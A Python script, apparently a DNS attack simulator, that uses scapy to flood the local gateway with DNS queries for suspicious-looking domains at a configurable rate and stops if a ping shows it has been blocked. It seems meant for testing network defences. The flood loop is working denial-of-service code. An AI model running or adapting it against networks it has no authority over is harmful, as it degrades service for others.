import socket
import asyncio
import random
import time
from scapy.all import IP, UDP, DNS, DNSQR, send, conf, ICMP, sr1
import argparse
from datetime import datetime
import netifaces as ni

class DNSAttackSimulator:
    def __init__(self, interface="en0"):  # Default to en0 for MacOS
        self.interface = interface
        conf.iface = interface
        
        # Get your gateway IP
        gws = ni.gateways()
        self.gateway = gws['default'][ni.AF_INET][0]
        
        # Get your local IP
        addrs = ni.ifaddresses(interface)
        self.local_ip = addrs[ni.AF_INET][0]['addr']
        
        print(f"Using interface: {interface}")
        print(f"Local IP: {self.local_ip}")
        print(f"Gateway IP: {self.gateway}")
        
        self.domains = [
            "google.com",
            "a" * 30 + ".com",    # Length pattern
            "0123456789abcdef" * 2 + ".com",  # Hex pattern
            "malicious-looking-domain.top",    # Suspicious TLD
            "definitely-not-suspicious.cc",     # Another suspicious TLD
            f"{random.randint(1000000, 9999999)}.xyz"  # Random subdomain
        ]

    def is_blocked(self) -> bool:
        """Check if the attack is being blocked by pinging the gateway."""
        try:
            pkt = IP(dst=self.gateway)/ICMP()
            resp = sr1(pkt, timeout=1, verbose=0)
            if resp is None:
                return True
            return False
        except Exception as e:
            print(f"Error checking block status: {e}")
            return False

    async def dns_flood_attack(self, duration: int = 10, rate: int = 100):
        """Simulate a DNS flood attack"""
        print(f"\n[+] Starting DNS flood attack for {duration} seconds at {rate} qps")
        start_time = time.time()
        queries_sent = 0
        
        while time.time() - start_time < duration:
            try:
                if self.is_blocked():
                    print("Blocked")
                    break

                domain = random.choice(self.domains)
                # Create DNS query packet
                dns_packet = (
                    IP(src=self.local_ip, dst=self.gateway)/
                    UDP(sport=random.randint(49152, 65535), dport=53)/
                    DNS(rd=1, qd=DNSQR(qname=domain))
                )
                
                send(dns_packet, verbose=0, iface=self.interface)
                queries_sent += 1
                
                if queries_sent % rate == 0:
                    print(f"Attack progress: {queries_sent} queries sent")
                
                # Add small delay to control rate
                await asyncio.sleep(1/rate)
                
            except Exception as e:
                print(f"Error during attack: {e}")
                break
        
        return queries_sent

async def main():
    parser = argparse.ArgumentParser(description='DNS Attack Simulation Tool')
    parser.add_argument('--interface', default='en0', help='Network interface to use')
    parser.add_argument('--duration', type=int, default=10, help='Attack duration in seconds')
    parser.add_argument('--rate', type=int, default=50, help='Queries per second')
    
    args = parser.parse_args()
    
    print(f"""
DNS Attack Simulation Starting
-----------------------------
Interface: {args.interface}
Duration: {args.duration} seconds
Rate: {args.rate} queries/second
    """)
    
    simulator = DNSAttackSimulator(interface=args.interface)
    queries = await simulator.dns_flood_attack(args.duration, args.rate)
    print(f"\nAttack completed: {queries} queries sent")

if __name__ == "__main__":
    # Install required package if not present
    try:
        import netifaces
    except ImportError:
        import subprocess
        import sys
        subprocess.check_call([sys.executable, "-m", "pip", "install", "netifaces"])
        import netifaces
    
    asyncio.run(main())

